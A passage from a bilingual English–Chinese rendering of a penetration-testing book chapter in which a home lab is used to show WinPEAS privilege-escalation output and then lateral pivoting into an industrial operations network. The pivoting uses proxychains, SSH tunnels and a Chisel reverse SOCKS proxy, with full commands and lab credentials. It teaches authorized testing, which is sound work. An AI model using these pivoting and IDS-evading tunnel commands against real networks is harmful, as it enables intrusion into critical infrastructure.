    (**WinPEAS**) allows us to sit back and let the programming do its thing. As the
    various tests run, we can watch as the output hits the screen. The information
    is color-coded so that we can easily spot potential points of entry. We will see
    links to hints and tricks for escalating privileges along the way. The following
    screenshot shows the **Basic System Information** options that were discovered:'
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们将运行一个模块，执行自动化测试，帮助找到利用路径。我们将使用WinPEAS模块，位于**privesc**类别下。**Windows 特权提升精彩脚本**（**WinPEAS**）允许我们放松并让程序自动运行。在各种测试进行时，我们可以看到输出显示在屏幕上。信息采用颜色编码，这样我们就能轻松发现潜在的入口点。过程中我们会看到有关提升特权的提示和技巧链接。以下截图展示了发现的**基本系统信息**选项：
- en: '![Figure 11.47 – WinPEAS Basic System Information'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.47 – WinPEAS 基本系统信息'
- en: '](image/B16321_11_047.jpg)'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_047.jpg)'
- en: Figure 11.47 – WinPEAS Basic System Information
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.47 – WinPEAS 基本系统信息
- en: 'As we scroll through this information, we will see that WinPEAS has pulled
    out more useful information regarding the system, such as Network Ifaces and known
    hosts, as shown in the following screenshot:'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们继续浏览这些信息时，会看到 WinPEAS 提取了更多关于系统的有用信息，比如网络接口和已知主机，如下图所示：
- en: '![Figure 11.48 – Network Ifaces and known hosts'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.48 – 网络接口和已知主机'
- en: '](image/B16321_11_048.jpg)'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_048.jpg)'
- en: Figure 11.48 – Network Ifaces and known hosts
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.48 – 网络接口和已知主机
- en: 'Under Ifaces and known hosts, we can see a list of devices that our victim
    has communicated with. We can see **Domain Controller** at **.2**, Kali Linux
    at **.6**, and the firewall that we installed at **.7**. If we continue to scroll
    through the information that WinPEAS has produced, we will come across a **Saved
    RDP connections** section, as shown here:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 在“网络接口”和“已知主机”下，我们可以看到受害者与之通信的设备列表。我们可以看到 **域控制器** 位于 **.2**，Kali Linux 位于 **.6**，以及我们安装的防火墙位于
    **.7**。如果继续浏览 WinPEAS 生成的信息，我们会找到一个 **已保存的 RDP 连接** 部分，如下所示：
- en: '![Figure 11.49 – Saved RDP connections'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.49 – 已保存的 RDP 连接'
- en: '](image/B16321_11_049.jpg)'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_049.jpg)'
- en: Figure 11.49 – Saved RDP connections
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.49 – 已保存的 RDP 连接
- en: 'The list goes on for discovery. The more we scroll, the more we find, and we
    will even find the Kerberos tickets that we dumped with mimikatz. Here is an example
    of the Kerberos ticket discovery process when using WinPEAS:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 随着浏览的深入，我们会发现更多内容，甚至可以找到我们用 mimikatz 转储的 Kerberos 票据。以下是使用 WinPEAS 进行 Kerberos
    票据发现的一个示例：
- en: '![Figure 11.50 – kerberos tickets'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.50 – kerberos 票据'
- en: '](image/B16321_11_050.jpg)'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_050.jpg)'
- en: Figure 11.50 – kerberos tickets
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.50 – kerberos 票据
- en: There are various tools we can use to get the job done. In this section, we
    explored dumping credentials, dumping tickets, PTT attacks, and running WinPEAS
    to find a path to privilege escalation. Working with these techniques and tools
    is important as every environment is different and each setup and local policy
    is different. You have to be versatile and comfortable with the tools that you
    are using to adapt them to your customer's parameters. In the next section, we
    are going to discuss pivoting through the environment and get deeper and closer
    to the real critical process.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用各种工具来完成这项工作。在本节中，我们探讨了转储凭证、转储票据、PTT 攻击以及运行 WinPEAS 来寻找提权路径。掌握这些技巧和工具非常重要，因为每个环境都是不同的，每种设置和本地策略也各不相同。你必须灵活并且熟练使用这些工具，以便将它们适应于客户的环境。在下一节中，我们将讨论如何通过环境进行转发，深入接近真实的关键进程。
- en: Pivoting
  id: totrans-229
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 网络转发
- en: 'One of the most fundamentally important parts of pentesting is pivoting. If
    you don''t take anything else away from reading this book, make sure that you
    bake pivoting into your brain. Pivoting is the technique of leveraging a compromised
    machine to exploit an additional machine that''s deeper in the network. Several
    methods and tools can be used to perform this task. You can use tunneling, proxying,
    and port forwarding to accomplish this task. We touched on a couple of these methods
    already, including port forwarding with NAT rules with the pfSense firewall, which
    we did in this chapter, and proxying with FoxyProxy in [*Chapter 9*](B16321_09_Epub_AM.xhtml#_idTextAnchor106),
    *Ninja 308*. There are also other tools we can use, such as the following:'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试中最基本且最重要的部分之一就是网络转发。如果你从阅读本书中只学到一件事，那就确保把网络转发技巧牢记在脑中。网络转发是一种利用已被攻破的机器来攻击位于网络更深处的另一台机器的技巧。可以使用多种方法和工具来完成这项任务。你可以使用隧道技术、代理和端口转发来完成这项任务。我们已经涉及到了一些方法，包括使用
    pfSense 防火墙的 NAT 规则进行端口转发（在本章中我们做过）和使用 FoxyProxy 进行代理（见 [*第 9 章*](B16321_09_Epub_AM.xhtml#_idTextAnchor106)），*Ninja
    308*。此外，我们还可以使用其他工具，例如：
- en: Proxychains
  id: totrans-231
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Proxychains
- en: SSH tunneling and port forwarding
  id: totrans-232
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: SSH 隧道和端口转发
- en: Chisel
  id: totrans-233
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Chisel
- en: 'These tools are what we will use to explore pivoting. We will use these tools
    to pivot from our Kali host, through our Windows 10 workstation, down to our Windows
    7 machine, which is sitting at the operations and control level of our network.
    Our approach will follow the red line shown on the following network diagram:'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 这些工具将帮助我们探索网络转发。我们将使用这些工具从 Kali 主机转发，通过 Windows 10 工作站，再到我们的 Windows 7 机器，该机器位于我们网络的操作与控制层级。我们的操作将遵循以下网络图中的红色线路：
- en: '![Figure 11.51 – Network pivot'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.51 – 网络转发'
- en: '](image/B16321_11_051.jpg)'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_051.jpg)'
- en: Figure 11.51 – Network pivot
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.51 – 网络转发
- en: 'To start, we have to make sure that our Windows 10 machine is running OpenSSH
    Server, which can be installed by going to **Apps & features** | **Optional features**
    | **Add a feature**:'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们必须确保 Windows 10 机器正在运行 OpenSSH 服务器，可以通过访问**应用与功能** | **可选功能** | **添加功能**来安装：
- en: '![Figure 11.52 – OpenSSH Server'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.52 – OpenSSH 服务器'
- en: '](image/B16321_11_052.jpg)'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_052.jpg)'
- en: Figure 11.52 – OpenSSH Server
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.52 – OpenSSH 服务器
- en: 'Once installed, you will need to start **OpenSSH SSH Server** by going to **Services
    Snap-in**, as shown here:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 安装完成后，你需要通过访问**服务管理器**来启动**OpenSSH SSH 服务器**，如图所示：
- en: '![Figure 11.53 – OpenSSH SSH Server'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.53 – OpenSSH SSH 服务器'
- en: '](image/B16321_11_053.jpg)'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_053.jpg)'
- en: Figure 11.53 – OpenSSH SSH Server
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.53 – OpenSSH SSH 服务器
- en: 'This will allow us to perform SSH tunneling and utilize proxychains to pivot
    through our firewall and down to the Windows 7 host. Once the server is running,
    we can test the connection by running **ssh** to connect to it from our Kali box.
    Here, you must use the **ssh operator1@172.16.0.4** command. You see results similar
    to the following once you''ve successfully accessed your host:'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 这样，我们就可以进行 SSH 隧道连接，并利用 proxychains 通过防火墙向 Windows 7 主机进行跳转。一旦服务器启动，我们可以通过运行**ssh**命令，从
    Kali 主机连接到它，进行连接测试。你需要使用 **ssh operator1@172.16.0.4** 命令。成功访问主机后，你会看到类似以下内容的结果：
- en: '![Figure 11.54 – SSH Windows 10'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.54 – SSH Windows 10'
- en: '](image/B16321_11_054.jpg)'
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_054.jpg)'
- en: Figure 11.54 – SSH Windows 10
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.54 – SSH Windows 10
- en: If you were to test using **xfreerdp** to run remote desktop to our Windows
    7 box, you would see that it works, and that means our current NAT rule is allowing
    the entire corp subnet to access the operations network.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你使用 **xfreerdp** 测试连接到我们的 Windows 7 主机，你会看到它能正常工作，这意味着当前的 NAT 规则允许整个企业子网访问操作网络。
- en: 'Use the following command to test your remote connection and NAT rules:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 使用以下命令来测试你的远程连接和 NAT 规则：
- en: xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
- en: 'You should see that we have access to the remote desktop of Windows 7\. We
    are going to change our NAT access rules to make sure that we are only allowing
    access from two hosts through the firewall. We will want our domain controller
    to be sitting at **172.16.0.2**, as well as our Windows 10 host, which can be
    found at **172.16.0.4**. The following screenshot shows what your new **Port Forward**
    NAT rules should look like:'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该看到我们已成功连接到 Windows 7 的远程桌面。接下来，我们将更改 NAT 访问规则，以确保防火墙只允许来自两个主机的访问。我们希望我们的域控制器位于**172.16.0.2**，以及我们的
    Windows 10 主机，位于**172.16.0.4**。下图显示了你新的**端口转发** NAT 规则应该是什么样子：
- en: '![Figure 11.55 – NAT rules'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.55 – NAT 规则'
- en: '](image/B16321_11_055.jpg)'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_055.jpg)'
- en: Figure 11.55 – NAT rules
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.55 – NAT 规则
- en: 'Now, go back and test the NAT rules by running **xfreerdp** again. If your
    rules are working, you should get a connection error, as shown here:'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，返回并通过再次运行 **xfreerdp** 来测试 NAT 规则。如果规则有效，你应该会看到连接错误，如下图所示：
- en: '![Figure 11.56 – Remote connection error'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.56 – 远程连接错误'
- en: '](image/B16321_11_056.jpg)'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_056.jpg)'
- en: Figure 11.56 – Remote connection error
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.56 – 远程连接错误
- en: With our NAT rules in place, we can simulate the pivoting portion of this chapter.
    We will start by setting up proxychains.
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 有了我们的 NAT 规则后，我们可以模拟本章的跳转部分。我们将从设置 proxychains 开始。
- en: Proxychains
  id: totrans-262
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Proxychains
- en: 'Proxychains is a program that manages dynamically linking connections and redirects
    those connections through SOCKS4a/5 or HTTP proxies. Proxychains is to command-line
    tools what FoxyProxy is to websites. The ease of use of Proxychains shines when
    running commands as all you have to do is prepend the start of your command with
    **proxychains**. An example would be taking the previous test and running it with
    **proxychains**:'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: Proxychains 是一个管理动态连接并通过 SOCKS4a/5 或 HTTP 代理重定向连接的程序。Proxychains 就是命令行工具对比 FoxyProxy
    对网站的作用。使用 Proxychains 的便利性体现在运行命令时，你只需要在命令前加上 **proxychains**。举个例子，就是将之前的测试命令加上
    **proxychains** 后运行：
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
- en: Go to [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
    to learn more about **proxychains** if you are interested.
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 访问 [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
    以了解更多关于**proxychains**的信息， 如果你感兴趣的话。
- en: 'To configure **proxychains**, we are going to navigate to **/etc/proxychains.conf**,
    scroll down to the **[ProxyList]** section, and add a new line; that is, **socks5
    127.0.0.1 9000**. The port can be any number that you would like to use. Here
    is the output at the bottom of my file that I am using in my lab:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 要配置**proxychains**，我们将导航到**/etc/proxychains.conf**，滚动到**[ProxyList]**部分，并添加一行；即，**socks5
    127.0.0.1 9000**。端口可以是你希望使用的任何数字。以下是我在实验中使用的文件底部输出：
- en: '![Figure 11.57 – proxychains.conf'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.57 – proxychains.conf'
- en: '](image/B16321_11_057.jpg)'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_057.jpg)'
- en: Figure 11.57 – proxychains.conf
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.57 – proxychains.conf
- en: After configuring **proxychains**, we still need to build a tunnel to leverage
    the proxy. We will learn how to do this in the next section.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 配置**proxychains**后，我们仍然需要建立一个隧道来利用代理。我们将在下一部分学习如何做到这一点。
- en: SSH tunneling and port forwarding
  id: totrans-271
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: SSH 隧道和端口转发
- en: SSH tunneling allows an attacker to essentially *tunnel* a different protocol
    through an established SSH session and ultimately evade **intrusion detection
    systems** (**IDS**). This practice is most commonly used in *nix* systems, but
    as you saw with our Windows 10 host, OpenSSH is a feature that can be enabled
    by default.
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 隧道使攻击者能够通过已建立的 SSH 会话“隧道”传输不同的协议，并最终避开**入侵检测系统**（**IDS**）。这种做法在*nix*系统中最为常见，但正如你在我们的
    Windows 10 主机中看到的，OpenSSH 是一个可以默认启用的功能。
- en: Storytime
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 讲故事时间
- en: I can't even count the number of times that I have heard in my career, from
    security managers, that port **22**/SSH is disabled in their environments. Often,
    they would chuckle, saying that their infrastructure is Windows-based, so SSH
    doesn't exist in their network. This was true in the corporate segment of the
    network for a while, especially if the company wasn't using a solution such as
    SolarWinds that uses SSH to log into every switch, router, gateway, and firewall,
    but in the industrial segment, a large portion of the equipment uses SSH. Several
    industrial security products require SSH to be enabled on equipment for data to
    be harvested for **North American Electric Reliability Corporation/Critical Infrastructure
    Protection** (**NERC/CIP**) compliance.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 我无法计数我在职业生涯中听到的次数，来自安全经理们常说他们的环境中禁用了端口**22**/SSH。通常他们会笑着说，他们的基础设施是基于 Windows
    的，所以网络中没有 SSH。这在一段时间内确实在网络的企业部分中是成立的，尤其是如果公司没有使用如 SolarWinds 这样的解决方案，它使用 SSH 登录到每个交换机、路由器、网关和防火墙，但在工业领域，很多设备使用
    SSH。若干工业安全产品要求在设备上启用 SSH，以便为**北美电力可靠性公司/关键基础设施保护**（**NERC/CIP**）合规性收集数据。
- en: 'We can create port forwards with the SSH **-L** switch, which establishes a
    link to whatever port you designate. Run the following command:'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用 SSH **-L** 选项创建端口转发，该选项会建立一个到指定端口的链接。运行以下命令：
- en: ssh -L 5555:172.16.0.7:3389 -fn operator1@172.16.0.4
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: ssh -L 5555:172.16.0.7:3389 -fn operator1@172.16.0.4
- en: 'This will establish a local link between port **5555** and our remote host
    using port **3389**, which is the remote desktop. We can then use the **-fn**
    switch to background the shell and not run any commands. Finally, we will use
    **operator1** to create the tunnel through our Windows 10 workstation, which we
    know has access to the Windows 7 host. The following diagram shows the communication
    path that we will be attempting:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 这将通过端口**5555**在本地与我们的远程主机（使用端口**3389**，即远程桌面）建立本地连接。然后，我们可以使用**-fn**选项将 Shell
    置于后台并不执行任何命令。最后，我们将使用**operator1**通过我们的 Windows 10 工作站创建隧道，我们知道它可以访问 Windows 7
    主机。以下图示展示了我们将尝试的通信路径：
- en: '![Figure 11.58 – Port forward'
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.58 – 端口转发'
- en: '](image/B16321_11_058.jpg)'
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_058.jpg)'
- en: Figure 11.58 – Port forward
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.58 – 端口转发
- en: 'Now that we have port forwarding and the SSH tunnel established, we can run
    the following command:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经建立了端口转发和 SSH 隧道，我们可以运行以下命令：
- en: xfreerdp /u:operator1 /p:Password1 /v:localhost:5555
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: xfreerdp /u:operator1 /p:Password1 /v:localhost:5555
- en: 'This will open a remote desktop session. If you open Wireshark and capture
    the session, you will see the results of the *tunnel* connection, as shown here:'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 这将打开一个远程桌面会话。如果你打开 Wireshark 并捕获该会话，你将看到*tunnel*连接的结果，如下所示：
- en: '![Figure 11.59 – SSH tunnel'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.59 – SSH 隧道'
- en: '](image/B16321_11_059.jpg)'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_059.jpg)'
- en: Figure 11.59 – SSH tunnel
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.59 – SSH 隧道
- en: 'Now that we have covered the general principles of **proxychains** and SSH
    tunnels, I am going to combine the two by creating a dynamic tunnel using the
    SSH **-D** switch. Go ahead and run the following command:'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经涵盖了**proxychains**和 SSH 隧道的基本原理，我将通过使用 SSH **-D** 选项创建一个动态隧道来将两者结合起来。请继续运行以下命令：
- en: ssh -D 9000 -fN operator1@172.16.0.4
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: ssh -D 9000 -fN operator1@172.16.0.4
- en: 'Very similar to SSH port forwarding, instead of linking to a dedicated port
    on a specific host, we can use **-D** to create a proxy. Now, we can run the following
    command:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 与 SSH 端口转发非常相似，不是连接到特定主机上的专用端口，我们可以使用 **-D** 创建代理。现在，我们可以运行以下命令：
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
- en: This will use **proxychains**, along with our SSH tunnel, to open a remote desktop
    window. I use **proxychains** with dynamic tunneling as it is much easier to set
    up as you don't have to map every remote port.
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 这将结合 **proxychains** 和我们的 SSH 隧道打开远程桌面窗口。我使用 **proxychains** 和动态隧道，因为它更容易设置，你不需要为每个远程端口进行映射。
- en: Chisel
  id: totrans-292
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Chisel
- en: Chisel is a tool written in Go that allows an attacker to create an SSH tunnel
    between two hosts, independent of the host's SSH software. This is a great tool
    to use if you get a shell on a Windows host that does not have OpenSSH Server
    installed. We need to have the dedicated binaries for the system that we are going
    to compromise. You can download these binaries from [https://github.com/jpillora/chisel/releases/tag/v1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6).
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: Chisel 是一款用 Go 编写的工具，允许攻击者在两台主机之间创建 SSH 隧道，独立于主机的 SSH 软件。如果你在一台没有安装 OpenSSH
    Server 的 Windows 主机上获得了 shell，那么使用这个工具非常合适。我们需要为将要攻破的系统准备专用的二进制文件。你可以从 [https://github.com/jpillora/chisel/releases/tag/v1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6)
    下载这些二进制文件。
- en: 'I grabbed both the **linux_amd64** and **windows_amd64** binaries. We need
    to get **chisel_windows_amd64** onto our Windows 10 host. I think we have covered
    multiple ways to do this throughout this book, so I will leave it up to you to
    get the binary onto the box. Next, we want to set up a Chisel server on our Kali
    Linux box. This way, we will create a **reverse socks proxy**. Run the following
    command:'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 我抓取了 **linux_amd64** 和 **windows_amd64** 两个二进制文件。我们需要将 **chisel_windows_amd64**
    文件放到我们的 Windows 10 主机上。我想我们在本书中已经涵盖了多种方法，所以我将留给你决定如何将二进制文件传输到目标主机。接下来，我们想在 Kali
    Linux 主机上设置一个 Chisel 服务器。这样，我们将创建一个 **反向 socks 代理**。运行以下命令：
- en: ./chisel server -p 5555 –reverse &
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: ./chisel server -p 5555 –reverse &
- en: 'This will tell Chisel to create a reverse proxy server listening on port **5555**
    and run it in the background. If you want to troubleshoot the connection, then
    simply drop the **&** symbol and run the server. You will see the following results:'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 这将告诉 Chisel 创建一个监听 **5555** 端口的反向代理服务器，并在后台运行。如果你想排查连接问题，只需去掉 **&** 符号并运行服务器。你将看到以下结果：
- en: '![Figure 11.60 – Chisel server'
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.60 – Chisel 服务器'
- en: '](image/B16321_11_060.jpg)'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_060.jpg)'
- en: Figure 11.60 – Chisel server
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.60 – Chisel 服务器
- en: 'On our Windows10 host, we want to run the following **client** command to create
    the reverse proxy connection:'
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的 Windows10 主机上，我们希望运行以下 **client** 命令来创建反向代理连接：
- en: chisel.exe client 172.16.0.6:5555 R:socks &
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: chisel.exe client 172.16.0.6:5555 R:socks &
- en: 'Once again, drop the **&** symbol to troubleshoot the connection. You should
    see the following output:'
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 再次去掉 **&** 符号来排查连接问题。你应该能看到以下输出：
- en: '![Figure 11.61 – Reverse proxy'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.61 – 反向代理'
- en: '](image/B16321_11_061.jpg)'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_061.jpg)'
- en: Figure 11.61 – Reverse proxy
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.61 – 反向代理
- en: 'As you may have noticed by the last line of output after we ran the **server**
    command, a reverse socks proxy is listening on port **1080**, as shown here:'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你可能已经注意到的，当我们运行 **server** 命令后，最后一行输出显示反向 socks 代理正在监听 **1080** 端口，如下所示：
- en: '![Figure 11.62 – Reverse proxy listener'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.62 – 反向代理监听器'
- en: '](image/B16321_11_062.jpg)'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_062.jpg)'
- en: Figure 11.62 – Reverse proxy listener
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.62 – 反向代理监听器
- en: 'For us to use **proxychains**, we need to change the port in our configuration
    from **9000**, which we used for SSH tunneling, to **1080**, which Chisel created.
    Once the port has been created, rerun the **proxychains** command:'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使用 **proxychains**，我们需要将配置中的端口从 **9000**（用于 SSH 隧道）更改为 **1080**，这是 Chisel
    创建的端口。一旦端口创建完成，重新运行 **proxychains** 命令：
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
- en: 'If everything worked correctly, you should be sitting with an authenticated
    Windows 7 remote desktop session:'
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切正常，你应该能够进入一个经过身份验证的 Windows 7 远程桌面会话：
- en: '![Figure 11.63 – Chisel reverse shell with proxychains'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.63 – 使用 proxychains 的 Chisel 反向 shell'
- en: '](image/B16321_11_063.jpg)'
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_063.jpg)'
- en: Figure 11.63 – Chisel reverse shell with proxychains
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.63 – 使用 proxychains 的 Chisel 反向 shell
- en: As you can see, it is fairly simple to pivot through a trusted workstation,
    past a firewall, down into the operational network, and onto a workstation with
    a few short commands. Having a fully authenticated session allows us to wreak
    havoc on the operational network if we were so inclined to and if it is part of
    our rules of engagement. To do this, we used **proxychains**, combined with SSH
    tunneling, to gain a foothold deeper in the network, but we needed SSH to be present
    on the Windows 10 host. To get around the requirement of needing SSH to be present
    and installed, we used Chisel to gain access.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，通过受信任的工作站、绕过防火墙、进入操作网络，再通过几个简单的命令到达工作站是相当简单的。拥有完全认证的会话可以让我们对操作网络造成破坏，如果我们有意为之，且这符合我们的规则。为此，我们使用了**proxychains**，结合SSH隧道，深入网络获取立足点，但我们需要Windows
    10主机上安装SSH。为了绕过SSH安装要求，我们使用了Chisel来获取访问权限。
- en: These techniques only showed the usability of a single hop. Hopefully, the industrial
    network you land on is fairly flat and this is good enough, but I do know that
    defense in depth has gained major traction, which means we have to up our game
    and perform multi-hop pivots. I will leave it up to you to investigate how to
    use the tools we just tested further to perform multi-hop pivots.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 这些技术展示了单跳的可用性。希望你进入的工业网络较为平坦，这样就足够了，但我知道深度防御得到了广泛应用，这意味着我们必须提升自己的技术，进行多跳渗透。我会把如何使用我们刚刚测试过的工具进行多跳渗透的研究留给你。
- en: Summary
  id: totrans-318
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: 'Throughout this chapter, we have looked at various tools and techniques for
    harvesting credentials and tickets. We leveraged the *loot* that we captured to
    escalate our privileges, and then we proceeded to pivot through the firewall that
    we installed and configured in the first section of this chapter. I know I said
    it earlier, but I am going to say it again: as my late friend Trevor would say,
    learning how to pivot is one of the most fundamental skills to develop and practice
    as a pentester and never forget Smashburger. I am hoping that as you read and
    worked through this chapter, you gained a better appreciation for why it is so
    critical to have access to a lab to spin systems up and tear them down, navigate
    in and around them, and mirror them to replicate your customer''s environment.'
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们探讨了收集凭证和票据的各种工具和技术。我们利用捕获到的*战利品*提升了权限，然后通过我们在本章第一节中安装并配置的防火墙进行横向渗透。我知道我之前说过，但我再重复一遍：正如我已故的朋友特雷弗所说，学习如何进行横向渗透是渗透测试员最基本的技能之一，且永远不要忘记Smashburger。希望在阅读和完成本章的过程中，你能更好地理解为何拥有一个实验室来启动和拆除系统、在其中穿梭并复制客户的环境是如此重要。
- en: Now that we have gone this far and we are on the operational side of the network,
    in the next chapter, we will be interacting with the physical process by using
    the user interface of Ignition SCADA and scripting.
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
